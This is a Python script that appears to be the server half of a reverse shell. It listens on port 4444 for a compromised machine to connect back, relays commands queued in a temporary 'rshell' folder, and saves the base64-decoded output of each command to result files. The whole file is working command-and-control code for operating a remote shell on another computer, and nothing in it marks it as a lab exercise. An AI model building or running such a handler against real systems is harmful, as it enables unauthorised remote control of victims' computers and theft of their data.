import base64
import os
import socket
import time

BASE = os.path.join(os.environ["TEMP"], "rshell")
os.makedirs(BASE, exist_ok=True)
RUN = os.path.join(BASE, "run.txt")
LOG = os.path.join(BASE, "server.log")


def log(msg):
    with open(LOG, "a", encoding="utf-8") as fh:
        fh.write(time.strftime("%H:%M:%S ") + msg + "\n")


try:
    open(RUN, "w", encoding="utf-8").close()
except OSError:
    pass


def recv_result(rf):
    b64 = ""
    seen = False
    while True:
        line = rf.readline()
        if not line:
            return None
        line = line.decode("utf-8", "replace").rstrip("\r\n")
        if line == "EOC":
            if seen:
                break
            seen = True
            continue
        if seen:
            b64 += line
    try:
        return base64.b64decode(b64).decode("utf-8", "replace")
    except Exception as exc:
        return "DECODE ERROR: %r" % exc


srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", 4444))
srv.listen(2)
log("listening on 0.0.0.0:4444")

last_id = None
while True:
    log("waiting for client")
    conn, addr = srv.accept()
    log("connected from %s" % (addr,))
    rf = conn.makefile("rb")
    last_active = time.time()
    while True:
        time.sleep(0.5)
        try:
            with open(RUN, "r", encoding="utf-8") as fh:
                content = fh.read()
        except FileNotFoundError:
            continue
        if content.strip():
            first_line, _, rest = content.partition("\n")
            rid = first_line.strip()
            cmd = rest.strip("\n")
            if not rid or rid == last_id:
                continue
            last_id = rid
            log("run %s: %s" % (rid, cmd[:100]))
            try:
                conn.sendall((cmd + "\n").encode("utf-8"))
            except OSError:
                log("send failed, connection lost")
                break
            out = recv_result(rf)
            if out is None:
                log("connection lost")
                break
            with open(os.path.join(BASE, "result-%s.txt" % rid), "w", encoding="utf-8") as fh:
                fh.write(out)
            log("done %s (%d chars)" % (rid, len(out)))
            last_active = time.time()
        elif time.time() - last_active > 45:
            try:
                conn.sendall(b"\n")
            except OSError:
                log("keepalive failed, connection lost")
                break
            out = recv_result(rf)
            if out is None:
                log("keepalive connection lost")
                break
            last_active = time.time()
    try:
        conn.close()
    except OSError:
        pass
    log("client disconnected, back to accept")
